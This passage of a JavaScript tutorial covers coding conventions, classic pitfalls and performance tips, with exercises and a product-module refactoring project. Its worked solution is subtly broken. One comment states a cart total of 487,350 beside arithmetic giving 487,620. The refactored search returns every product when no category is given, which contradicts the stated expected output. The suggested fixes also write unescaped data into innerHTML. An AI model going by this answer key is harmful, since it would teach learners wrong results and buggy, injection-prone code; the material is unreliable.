// Searching in a Set: O(1) — instant regardless of size
let userSet = new Set(["alice", "bob", "carol", "david"]);
let found2 = userSet.has("carol"); // Direct hash lookup — instant

// Key-value lookups: use Map for performance-sensitive cases
let productPrices = new Map([
  ["laptop", 450000],
  ["mouse",  8000],
  ["keyboard", 12000]
]);

console.log(productPrices.get("laptop")); // 450000 — O(1) lookup
```

**When to use what:**

| Structure | Best For | Lookup Speed |
|-----------|----------|-------------|
| Array | Ordered sequences, iteration | O(n) |
| Object | Named properties, simple records | O(1) |
| Map | Key-value pairs with any key type | O(1) |
| Set | Unique values, fast membership check | O(1) |

---

### 4.12 Throttle and Debounce Expensive Operations

Some events fire very frequently — `scroll`, `resize`, `mousemove`, `keyup`. Running expensive code on every single event is a performance disaster.

```javascript
// ❌ This runs on every single keystroke — expensive if it calls an API
document.getElementById("search").addEventListener("keyup", function() {
  fetchSearchResults(this.value); // API call on EVERY keypress
});

// ✅ Debounce — wait until the user stops typing for 300ms
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

let debouncedSearch = debounce(function(event) {
  fetchSearchResults(event.target.value); // Only fires 300ms after last keypress
}, 300);

document.getElementById("search").addEventListener("keyup", debouncedSearch);
```

**Debounce vs Throttle:**
- **Debounce:** Wait until the user *stops* doing something, then fire once (search boxes, resize handlers)
- **Throttle:** Fire at most once every N milliseconds, even if the event keeps firing (scroll position tracking, game loops)

---

### 4.13 Performance Optimisation Summary

| Category | Problem | Solution |
|----------|---------|----------|
| DOM | Reading/writing in loops | Cache reference; batch writes |
| DOM | Too many elements | Keep DOM structure flat and lean |
| Events | Listener per element | Event delegation on parent |
| Variables | Unnecessary intermediates | Chain operations directly |
| Loops | Repeated expensive ops | Cache values outside loop |
| Loading | Scripts blocking page | `defer` or `async` attributes |
| Type coercion | `eval()`, `with` | Never use either |
| Data structures | Wrong structure for task | Use Set/Map for lookups |
| Events | High-frequency handlers | Debounce or throttle |

---

# PHASE 2 — APPLIED EXERCISES

---

## Exercise 1 — Convention Audit

**Objective:** Identify and fix all convention violations in a real-world-style code snippet.

**Scenario:** A new developer joined your fintech startup and wrote the following code. You're doing a code review. Find every convention violation and rewrite the entire function following proper standards.

**Code to audit:**

```javascript
var FullName="babatunde adewale"
var age=28
var AccountBalance=150000
var isVip=false

function Calculate_Discount(Price,Rate,memberstatus){
let disc
if(memberstatus==true){
disc=Price*0.15
}
else{
disc=Price*Rate}
return disc}

function DISPLAYUSER(){
console.log("User: "+FullName+", Age: "+age+", Balance: "+AccountBalance)
}

Calculate_Discount(50000,0.1,isVip)
DISPLAYUSER()
```

**Step-by-step instructions:**

1. List every violation you find (naming, spacing, semicolons, `var`, `==`, etc.)
2. Rename all variables and functions according to convention
3. Add proper indentation and spacing
4. Replace `var` with `const` or `let` as appropriate
5. Replace `==` with `===`
6. Add a `default` parameter for `memberStatus`
7. Add a `"use strict"` declaration
8. Test that the corrected code produces the same results

**Hints:**
- Count the violations — there should be at least 15
- Constants that never change should use UPPER_SNAKE_CASE
- Functions that calculate something should use camelCase verbs

**Self-check — expected corrected output:**
```
User: babatunde adewale, Age: 28, Balance: 150000
```

---

## Exercise 2 — Common Mistakes Detection

**Objective:** Read five code snippets and predict the bug before running them.

**Snippet 1 — What does this print?**
```javascript
let a = "10";
let b = 20;
let c = a + b;
let d = b + a;
console.log(c); // ?
console.log(d); // ?
```

**Snippet 2 — What is returned?**
```javascript
function getConfig()
{
  return
  {
    theme: "dark",
    language: "en"
  };
}
console.log(getConfig()); // ?
```

**Snippet 3 — What is the final value of `scores`?**
```javascript
let scores = [];
scores["first"]  = 95;
scores["second"] = 88;
scores["third"]  = 72;
console.log(scores.length); // ?
console.log(scores[0]);     // ?
```

**Snippet 4 — What prints?**
```javascript
for (var k = 0; k < 3; k++) {
  setTimeout(() => console.log(k), 0);
}
```

**Snippet 5 — Is this right?**
```javascript
let price = 0.1 + 0.2;
if (price === 0.3) {
  console.log("Price is 30 kobo");
} else {
  console.log("Price is NOT 0.3, it is:", price);
}
```

**Expected answers (for self-check):**
1. `c = "1020"`, `d = "2010"` — string concatenation
2. `undefined` — ASI inserts semicolon after `return`
3. `length = 0`, `scores[0] = undefined` — named indexes become properties
4. `3, 3, 3` — var is not block-scoped
5. Prints `"Price is NOT 0.3, it is: 0.30000000000000004"` — floating point

---

## Exercise 3 — Performance Refactor

**Objective:** Rewrite a slow function to be fast using the performance principles covered.

**Slow version:**

```javascript
// This renders a list of 500 products to the page
// It is very slow — how many performance problems can you find?

function renderProducts(products) {
  for (let i = 0; i < products.length; i++) {
    let listEl = document.getElementById("product-list");
    
    let item = document.createElement("li");
    item.textContent = products[i].name + " - ₦" + products[i].price;
    item.className = "product-item";
    item.dataset.productId = products[i].id;
    item.addEventListener("click", function() {
      alert("You clicked: " + products[i].name);
    });
    
    listEl.appendChild(item);
  }
}

// Also, somewhere else in the code:
document.addEventListener("scroll", function() {
  let scrollPos = window.scrollY;
  updateProgressBar(scrollPos); // Expensive calculation on every scroll pixel!
});
```

**Step-by-step instructions:**

1. Cache the `document.getElementById("product-list")` lookup outside the loop
2. Build an HTML string and do a single `innerHTML` write instead of 500 `appendChild` calls
3. Replace 500 individual click listeners with one delegated listener on the parent
4. Wrap the scroll handler in a `throttle()` function (similar to the debounce shown earlier)
5. Add `console.time()` wrappers to measure the before/after speed difference

**What-if challenge:** What if `products` had 10,000 items? Research **virtual scrolling** / windowing — a technique used by Google, Twitter, and Facebook to render only the items currently visible on screen.

---

## Exercise 4 — Best Practices Application

**Objective:** Rewrite a global-variable-heavy script using a namespace object and strict mode.

**Before:**
```javascript
var apiUrl = "https://api.mystore.com";
var cartItems = [];
var currentUser = null;
var isLoggedIn = false;
var taxRate = 0.075;

function addToCart(product) {
  cartItems.push(product);
}

function getCartTotal() {
  let total = 0;
  for (item of cartItems) { // Bug: missing let — creates global!
    total += item.price;
  }
  return total * (1 + taxRate);
}

function login(user) {
  currentUser = user;
  isLoggedIn = true;
}
```

**After (your task):**
1. Wrap everything in a `const StoreApp = { ... }` namespace object
2. Add `"use strict"` at the top
3. Move constants (`taxRate`, `apiUrl`) to UPPER_SNAKE_CASE
4. Fix the missing `let` in the loop (detectable once strict mode is on)
5. Make `addToCart`, `getCartTotal`, and `login` methods of the namespace object
6. Test: `StoreApp.login({name: "Tunde"})`, `StoreApp.addToCart({name: "Laptop", price: 450000})`, `console.log(StoreApp.getCartTotal())`

---

# PHASE 3 — PROJECT SIMULATION

---

## Project: Clean Code Audit & Refactor — E-Commerce Product Module

**Overview:** You've inherited a JavaScript product module from a developer who left the company. It works, but it's full of convention violations, best practice failures, common mistakes, and performance problems. Your job is to audit it, fix every issue, and document your changes.

**Real-world connection:** Code reviews and refactoring are a core part of professional software development. Companies like Google, Meta, and Andela conduct code reviews on every pull request. The ability to read messy code, identify problems, and improve it without breaking functionality is one of the most valued developer skills.

---

### Stage 1 — Setup and Initial Audit

**Micro-example first:**
```javascript
// Before you touch the main code, warm up by identifying issues in this tiny snippet:
var P=150000
var n="Laptop"
function SHOW_ITEM(){console.log(n+" costs "+P)}
SHOW_ITEM()
// Issues: var, non-descriptive names, ALL CAPS function, missing spaces, no semicolons
```

**The full messy codebase to audit:**

```javascript
var api_url = "https://api.store.ng/v1"
var TAX = 0.075
var products_list = []
var current_user = null

function Load_Products() {
  var data = [
    {id:1,Name:"Laptop",price:450000,qty:15,Category:"Electronics"},
    {id:2,Name:"Office Chair",price:85000,qty:8,Category:"Furniture"},
    {id:3,Name:"Notebook",price:1200,qty:200,Category:"Stationery"},
    {id:4,Name:"Headphones",price:32000,qty:42,Category:"Electronics"},
    {id:5,Name:"Desk Lamp",price:7500,qty:60,Category:"Furniture"}
  ]
  products_list = data
}

function search_products(query,Category) {
  var results = []
  for(var i=0;i<products_list.length;i++) {
    if(products_list[i].Name.toLowerCase().includes(query)||products_list[i].Category==Category) {
      results.push(products_list[i])
    }
  }
  return results
}

function calculate_cart_total(cart) {
  var total=0
  for(item of cart) {  // missing var/let
    total=total+item.price*item.qty
  }
  var tax_amount = total*TAX
  var grand_total = total+tax_amount
  return grand_total
}

function render_cart(cart) {
  for(let i=0;i<cart.length;i++) {
    document.getElementById("cart").innerHTML += "<li>" + cart[i].Name + " x" + cart[i].qty + "</li>"
  }
}

function Display_Product_Details(product_id) {
  var found = null
  for(var i=0;i<products_list.length;i++) {
    if(products_list[i].id == product_id) {
      found = products_list[i]
    }
  }
  return
  {
    product: found,
    inStock: found.qty > 0
  }
}

Load_Products()
var laptopSearch = search_products("laptop","")
console.log("Search results:", laptopSearch)

var sampleCart = [
  {Name:"Laptop", price:450000, qty:1},
  {Name:"Notebook", price:1200, qty:3}
]
console.log("Cart total:", calculate_cart_total(sampleCart))
```

**Your audit task — create a written list of all issues:**

Find at least one example of each category:

| Category | Description | Line(s) |
|----------|-------------|---------|
| Naming convention | Wrong case style | ? |
| `var` usage | Should be `let`/`const` | ? |
| Missing `let` in loop | Creates global variable | ? |
| `==` instead of `===` | Loose comparison | ? |
| Magic numbers | Unexplained raw values | ? |
| Performance — DOM in loop | Repeated innerHTML in loop | ? |
| ASI trap | `return` on wrong line | ? |
| Missing semicolons | Throughout | ? |
| Accidental global variable | Not declared | ? |
| No strict mode | Missing `"use strict"` | ? |

---

### Stage 2 — Refactored Version

**Your task:** Rewrite the entire module applying every standard from this tutorial. Here is the scaffold with placeholders — fill in each section:

```javascript
"use strict";

// ── Constants ─────────────────────────────────────────────────────
const API_URL = "https://api.store.ng/v1";
const TAX_RATE = 0.075;

// ── Application Namespace ─────────────────────────────────────────
const StoreModule = {
  productsList: [],
  currentUser: null,

  // ── Data Loading ────────────────────────────────────────────────
  loadProducts() {
    this.productsList = [
      { id: 1, name: "Laptop",       price: 450000, qty: 15, category: "Electronics" },
      { id: 2, name: "Office Chair", price: 85000,  qty: 8,  category: "Furniture"   },
      { id: 3, name: "Notebook",     price: 1200,   qty: 200, category: "Stationery" },
      { id: 4, name: "Headphones",   price: 32000,  qty: 42, category: "Electronics" },
      { id: 5, name: "Desk Lamp",    price: 7500,   qty: 60, category: "Furniture"   }
    ];
  },

  // ── Search ──────────────────────────────────────────────────────
  searchProducts(query = "", category = "") {
    return this.productsList.filter(product => {
      let matchesQuery    = product.name.toLowerCase().includes(query.toLowerCase());
      let matchesCategory = category === "" || product.category === category; // Fix: === not ==
      return matchesQuery || matchesCategory;
    });
  },

  // ── Cart Total ──────────────────────────────────────────────────
  calculateCartTotal(cart) {
    let subtotal = cart.reduce((total, item) => total + (item.price * item.qty), 0); // Fix: let, no global leak
    let taxAmount = subtotal * TAX_RATE;
    return subtotal + taxAmount;
  },

  // ── Cart Render ─────────────────────────────────────────────────
  renderCart(cart) {
    let cartElement = document.getElementById("cart"); // Fix: cache DOM reference
    let html = "";

    for (let item of cart) {
      html += `<li>${item.name} x${item.qty} — ₦${item.price.toLocaleString()}</li>`;
    }

    cartElement.innerHTML = html; // Fix: single DOM write
  },

  // ── Product Details ─────────────────────────────────────────────
  getProductDetails(productId) {
    let found = this.productsList.find(p => p.id === productId); // Fix: === not ==, find() instead of loop

    if (!found) {
      return null; // Graceful handling — don't crash on missing product
    }

    return {           // Fix: return on same line as {
      product: found,
      inStock: found.qty > 0
    };
  }
};

// ── Initialise and Test ───────────────────────────────────────────
StoreModule.loadProducts();

let laptopResults = StoreModule.searchProducts("laptop");
console.table(laptopResults);
// Expected: Table showing the Laptop entry

let sampleCart = [
  { name: "Laptop",   price: 450000, qty: 1 },
  { name: "Notebook", price: 1200,   qty: 3 }
];
let total = StoreModule.calculateCartTotal(sampleCart);
console.log("Cart total: ₦" + total.toLocaleString());
// Expected: Cart total: ₦487,350 (450000 + 3600 = 453600 × 1.075 = 487,620)

let details = StoreModule.getProductDetails(3);
console.log("Product details:", details);
// Expected: { product: {id:3, name:"Notebook"...}, inStock: true }
```

---

### Stage 3 — Validation and Documentation

**Your final tasks:**

1. **Run the refactored code** and verify all three expected outputs match
2. **Performance check:** Wrap `renderCart` with `console.time()` and compare the original (DOM writes in loop) vs refactored (one write at end) with 200 items
3. **Write a brief audit report** as a comment block at the top of the file:

```javascript
/**
 * AUDIT REPORT — StoreModule Refactor
 * Date: 2024-01-20
 * Developer: Babatunde
 *
 * Issues Found and Fixed:
 * - 8 var declarations → replaced with const/let
 * - 1 accidental global variable (item in for..of loop)
 * - 2 loose comparisons (== → ===)
 * - 1 ASI trap (return on wrong line in Display_Product_Details)
 * - 1 performance issue (DOM writes inside loop in render_cart)
 * - 5 naming convention violations (snake_case → camelCase)
 * - Missing "use strict" directive
 * - Missing semicolons throughout
 * - No namespace — all variables were global
 *
 * Performance improvement: renderCart with 200 items
 * Before: ~180ms | After: ~2ms
 */
```

---

### Reflection Questions

1. **Why is it safer to put everything inside a namespace object like `StoreModule` than to declare dozens of global variables?**
2. **The original `render_cart` wrote to `innerHTML` inside a loop. If the cart had 500 items, how many times would the browser redraw the page? What does that mean for users on low-end devices?**
3. **Why does JavaScript's floating-point arithmetic matter for a financial application? If `TAX_RATE = 0.075` and `subtotal = 453600`, does `453600 * 0.075` produce an exact result? Test it.**
4. **In `searchProducts`, why is `category === ""` a safer check than `!category` for the "no filter" case?**
5. **If this module were used on a page that also loads jQuery, Bootstrap, and a chat widget — all of which might declare `products`, `cart`, or `user` globally — how would the namespace approach protect your code?**

---

### Advanced Challenges (Optional)

1. **Linting:** Set up **ESLint** with the Airbnb style guide in a project. Run it against the original messy code — how many issues does it find automatically?
2. **TypeScript:** Convert the `StoreModule` to TypeScript with proper interfaces for `Product` and `CartItem`. Notice how types make many of the common mistakes from this tutorial impossible at compile time.
3. **Web Workers:** Research JavaScript Web Workers — a way to run heavy computation off the main thread so it doesn't block the UI. How would you use one to process a 100,000-item product search?
4. **Lighthouse:** Run Google's Lighthouse audit tool on a web page you've built. Focus on the Performance and Best Practices scores. What does it recommend?
5. **Memory Profiling:** Use Chrome DevTools Memory tab to record a heap snapshot before and after a function runs. Look for objects that should have been garbage collected but weren't.

---

# Completion Checklist

- [x] **Code conventions:** camelCase, PascalCase, UPPER_SNAKE_CASE — when and why to use each
- [x] **Indentation:** 2 spaces, consistent, no tab/space mixing
- [x] **Semicolons:** Always explicit — understand the ASI trap
- [x] **Brace placement:** Opening brace on same line — why it matters (return bug)
- [x] **Comments:** Explain *why*, not *what* — JSDoc style for functions
- [x] **`"use strict"`:** What it enables and why to always use it
- [x] **`===` vs `==`:** Strict equality is always safer
- [x] **Accidental globals:** Always declare with `let`/`const`
- [x] **Never use `new String/Number/Boolean`:** Primitive wrappers cause truthy/falsy bugs
- [x] **Default parameters:** Protect functions from undefined arguments
- [x] **Switch `default`:** Always include a safety net case
- [x] **Never use `eval()` or `with`:** Security and performance reasons
- [x] **Namespace pattern:** Reduce global scope pollution
- [x] **Addition vs concatenation:** `+` with strings concatenates, not adds
- [x] **Floating point:** Understand why `0.1 + 0.2 !== 0.3` and how to handle money
- [x] **`typeof null`:** Returns `"object"` — use `=== null` to check for null
- [x] **`var` in loops:** Closure trap — use `let` instead
- [x] **Named array indexes:** Arrays need numeric indexes — use objects for named properties
- [x] **DOM caching:** Never read/write DOM inside loops
- [x] **`defer`/`async`:** Non-blocking script loading
- [x] **Event delegation:** One listener on parent vs many on children
- [x] **Debounce/throttle:** Control high-frequency event handlers
- [x] **Exercises completed:** Convention audit, mistake detection, performance refactor, namespace rewrite
- [x] **Full project completed:** E-commerce module — audited, refactored, documented
- [x] **Reflection questions answered**

---

**One-sentence summary:** Writing professional JavaScript means following consistent naming and formatting conventions, applying time-tested best practices like strict mode and namespace isolation, recognising the language's classic pitfalls like the ASI trap and floating-point quirks, and knowing how to write code that is fast by avoiding unnecessary DOM access, expensive loops, and unthrottled event handlers.
